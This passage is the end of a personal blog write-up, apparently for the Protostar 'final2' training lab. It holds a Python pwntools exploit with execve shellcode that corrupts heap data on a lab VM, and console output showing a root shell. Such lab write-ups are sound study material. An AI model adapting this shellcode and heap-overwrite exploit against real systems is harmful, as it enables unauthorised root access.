shellcode = &#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#x27;

r = remote(&quot;192.168.116.137&quot;, 2993)
r.send(&quot;FSRD&quot; + &quot;A&quot;*(128-4-1) + &quot;&#x2F;&quot;)  
r.sendline(&quot;FSRD&quot; + &quot;ROOT&quot; + &quot;\x90&quot;*(128-len(shellcode)-4-4-1-4-4-4-4) + shellcode + &quot;&#x2F;&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\x10\xd4\x04\x08&quot; + &quot;\x98\xe0\x04\x08&quot; )

r.interactive()
</code></pre>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">root@kali:~&#x2F;Documents&#x2F;Protostar# python final2.py 
[+] Opening connection to 192.168.116.137 on port 2993: Done
[*] Switching to interactive mode
Process OK
$ id
uid=0(root) gid=0(root) groups=0(root)

</code></pre>

    </div>
  </div>

        </div>

        
          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
          <aside class="sidebar" name="sidebar">
            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
              
              <img class="site-author-image" itemprop="image"
                src="https://CSUwangj.github.io/images/avatar.png"
                alt="CSUwangj" />
              
              <p class="site-author-name unselectable">CSUwangj</p>
              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
            </div>
            <div class="feed-link">
              
                <a rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
                  RSS
                </a>
              
            </div>
            <div class="links-of-author">
              
                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
                  <i class="fa-brands fa-github"></i>
                </a>
              
                <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
                  <i class="fa-solid fa-envelope"></i>
                </a>
              
            </div>
            <div class="links-of-blogroll">
              
                <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
              
                <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
              
                <a href="http:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
              
                <a href="https:&#x2F;&#x2F;way.lu&#x2F;">Phosphorus</a>
              
                <a href="https:&#x2F;&#x2F;edwardzcn.github.io&#x2F;">Edwardzcn</a>
              
                <a href="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;csu-lmw&#x2F;">吕少</a>
              
                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
              
            </div>
          </aside>
        

      </main>

      
        <footer name="footer">
          <div class="copyright">
            <span item="copyrightYear">© 2018-2022</span>
            <span class="author">CSUwangj</span>
          </div>
          <div class="powered-by">
            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
          </div>
        </footer>
      
    </body>

</html>